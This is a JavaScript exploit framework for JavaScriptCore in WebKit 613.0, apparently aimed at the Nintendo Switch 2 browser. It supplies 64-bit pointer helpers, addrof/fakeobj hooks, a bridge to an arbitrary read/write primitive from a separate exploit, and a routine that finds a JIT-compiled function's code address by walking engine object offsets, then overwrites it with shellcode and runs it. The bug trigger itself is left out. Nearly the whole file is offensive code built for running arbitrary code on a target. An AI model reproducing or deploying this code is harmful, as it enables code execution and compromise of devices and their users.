// JSC exploit primitives for WebKit 613.0 / WKC 3.12.11 (Switch 2)
// Provides Int64, addrof/fakeobj helpers, arbitrary R/W, and shellcode execution.
// The actual vulnerability trigger must be plugged in separately.
(function() {
'use strict';

// --- Int64: 64-bit integer using BigInt ---
function Int64(v) {
  if (typeof v === 'bigint') this.n = BigInt.asUintN(64, v);
  else if (typeof v === 'number') this.n = BigInt.asUintN(64, BigInt(v));
  else if (typeof v === 'string') this.n = BigInt.asUintN(64, BigInt(v));
  else if (v instanceof Int64) this.n = v.n;
  else if (v instanceof ArrayBuffer || ArrayBuffer.isView(v)) {
    var buf = v instanceof ArrayBuffer ? v : v.buffer;
    var off = ArrayBuffer.isView(v) ? v.byteOffset : 0;
    var dv = new DataView(buf, off);
    this.n = dv.getBigUint64(0, true);
  } else throw new Error('Int64: unsupported input');
}

Int64.prototype.add = function(x) { return new Int64(this.n + Int64.coerce(x)); };
Int64.prototype.sub = function(x) { return new Int64(this.n - Int64.coerce(x)); };
Int64.prototype.and = function(x) { return new Int64(this.n & Int64.coerce(x)); };
Int64.prototype.or  = function(x) { return new Int64(this.n | Int64.coerce(x)); };
Int64.prototype.xor = function(x) { return new Int64(this.n ^ Int64.coerce(x)); };
Int64.prototype.shl = function(x) { return new Int64(this.n << BigInt(x)); };
Int64.prototype.shr = function(x) { return new Int64(this.n >> BigInt(x)); };

Int64.prototype.lo = function() { return Number(this.n & 0xFFFFFFFFn); };
Int64.prototype.hi = function() { return Number((this.n >> 32n) & 0xFFFFFFFFn); };

Int64.prototype.eq = function(x) { return this.n === Int64.coerce(x); };
Int64.prototype.ne = function(x) { return this.n !== Int64.coerce(x); };

Int64.prototype.toNumber = function() { return Number(this.n); };
Int64.prototype.toString = function(radix) {
  return '0x' + this.n.toString(radix || 16).padStart(16, '0');
};

Int64.prototype.bytes = function() {
  var buf = new ArrayBuffer(8);
  new DataView(buf).setBigUint64(0, this.n, true);
  return new Uint8Array(buf);
};

Int64.prototype.writeToView = function(dv, offset) {
  dv.setBigUint64(offset, this.n, true);
};

Int64.coerce = function(x) {
  if (x instanceof Int64) return x.n;
  if (typeof x === 'bigint') return BigInt.asUintN(64, x);
  return BigInt.asUintN(64, BigInt(x));
};

Int64.ZERO = new Int64(0);

// JSC NaN-boxing constants (ARM64)
var DOUBLE_ENCODE_OFFSET = new Int64(0x0002000000000000n);
var TAG_MASK             = new Int64(0xFFFF000000000000n);
var PAYLOAD_MASK         = new Int64(0x0000FFFFFFFFFFFFn);

// Encode a pointer as a JSValue (tagged pointer in NaN-box)
function encodePtr(addr) {
  return new Int64(addr).add(DOUBLE_ENCODE_OFFSET);
}

// Decode a JSValue back to a raw pointer
function decodePtr(jsval) {
  return new Int64(jsval).sub(DOUBLE_ENCODE_OFFSET);
}

// Convert a double to its raw bits
function f2i(f) {
  var buf = new ArrayBuffer(8);
  new Float64Array(buf)[0] = f;
  return new Int64(buf);
}

// Convert raw bits to a double
function i2f(i) {
  var buf = new Int64(i).bytes().buffer;
  return new Float64Array(buf)[0];
}


// --- Exploit framework ---
// These are STUBS that need a real vulnerability to implement.
// Each must be replaced with the actual bug's primitive.

var _addrof = null;  // function(obj) -> Int64 (address of JS object)
var _fakeobj = null;  // function(addr) -> object (forge a JS object at addr)

function addrof(obj) {
  if (!_addrof) throw new Error('addrof not initialized - need vulnerability');
  return _addrof(obj);
}

function fakeobj(addr) {
  if (!_fakeobj) throw new Error('fakeobj not initialized - need vulnerability');
  return _fakeobj(addr);
}

// Register the actual addrof/fakeobj from a specific CVE exploit
function registerPrimitives(addrofFn, fakeobjFn) {
  _addrof = addrofFn;
  _fakeobj = fakeobjFn;
}


// --- Arbitrary R/W ---
// The SC exploit (sc-exploit.js) installs window.rw directly from the
// corrupted Uint8Array memory window. These helpers bridge old callsites.

function getInstalledRW() {
  if (typeof window !== 'undefined' && window.rw) return window.rw;
  throw new Error('No R/W primitives installed — run sc-exploit first');
}


// --- ARM64 shellcode execution ---

// On ARM64 without PAC (Cortex-A78AE), we overwrite a JIT-compiled
// function's entry point and call it to run our shellcode.
// JSC on ARM64 uses RWX JIT pages when WASM isn't separated.

function executeShellcode(shellcodeBytes, rw) {
  if (!rw || !rw.read64 || !rw.write64) {
    throw new Error('Need arbitrary R/W primitive (read64/write64/writeBytes)');
  }

  // Step 1: Create and JIT-compile a function
  function jitTarget(x) {
    var sum = 0;
    for (var i = 0; i < 100; i++) sum += x + i;
    return sum;
  }
  for (var i = 0; i < 10000; i++) jitTarget(i);

  var funcAddr = addrof(jitTarget);

  // Step 2: Walk the JSC object chain to find the JIT code pointer
  // JSFunction layout (ARM64, WebKit 613.0):
  //   +0x00: JSCell header
  //   +0x08: butterfly
  //   +0x10: scope
  //   +0x18: executable (FunctionExecutable*)
  var executableAddr = rw.read64(funcAddr.add(0x18));
  if (!executableAddr || executableAddr.eq(0))
    throw new Error('Could not read executable pointer at funcAddr+0x18');

  // FunctionExecutable -> m_jitCodeForCall (CodeBlock* or DirectJITCode)
  // Probe known offsets for WebKit 613.0 (Safari 17.0)
  var jitCodeOffsets = [0x28, 0x30, 0x38, 0x20];
  var codeAddr = null;
  for (var j = 0; j < jitCodeOffsets.length; j++) {
    var candidate = rw.read64(executableAddr.add(jitCodeOffsets[j]));
    if (candidate && !candidate.eq(0)) {
      // JIT code pointers on ARM64 are typically in high memory (RWX region)
      var val = candidate.toNumber();
      if (val > 0x100000000 && val < 0x0000FFFFFFFFFFFF) {
        codeAddr = candidate;
        break;
      }
    }
  }

  if (!codeAddr) {
    // Fallback: read through CodeBlock to get the JIT code
    // CodeBlock is at ExecutableBase+0x10 in some builds
    var codeBlock = rw.read64(executableAddr.add(0x10));
    if (codeBlock && !codeBlock.eq(0)) {
      // CodeBlock -> m_jitCode (JITCode*) at +0x28 or +0x30
      var jitCode = rw.read64(codeBlock.add(0x28));
      if (jitCode && !jitCode.eq(0)) {
        // JITCode -> m_executableAddress at +0x10
        codeAddr = rw.read64(jitCode.add(0x10));
      }
    }
  }

  if (!codeAddr || codeAddr.eq(0))
    throw new Error('Could not locate JIT code address — offsets may need calibration');

  // Step 3: Write shellcode into the JIT region
  rw.writeBytes(codeAddr, shellcodeBytes);

  // Step 4: Execute by calling the JIT'd function
  return jitTarget(0);
}


// --- Exports ---

if (typeof window !== 'undefined') {
  window.Int64 = Int64;
  window.f2i = f2i;
  window.i2f = i2f;
  window.encodePtr = encodePtr;
  window.decodePtr = decodePtr;
  window.addrof = addrof;
  window.fakeobj = fakeobj;
  window.registerPrimitives = registerPrimitives;
  window.getInstalledRW = getInstalledRW;
  window.executeShellcode = executeShellcode;
  window.DOUBLE_ENCODE_OFFSET = DOUBLE_ENCODE_OFFSET;
}

return {
  Int64: Int64,
  f2i: f2i, i2f: i2f,
  encodePtr: encodePtr, decodePtr: decodePtr,
  addrof: addrof, fakeobj: fakeobj,
  registerPrimitives: registerPrimitives,
  getInstalledRW: getInstalledRW,
  executeShellcode: executeShellcode,
  DOUBLE_ENCODE_OFFSET: DOUBLE_ENCODE_OFFSET
};
})();
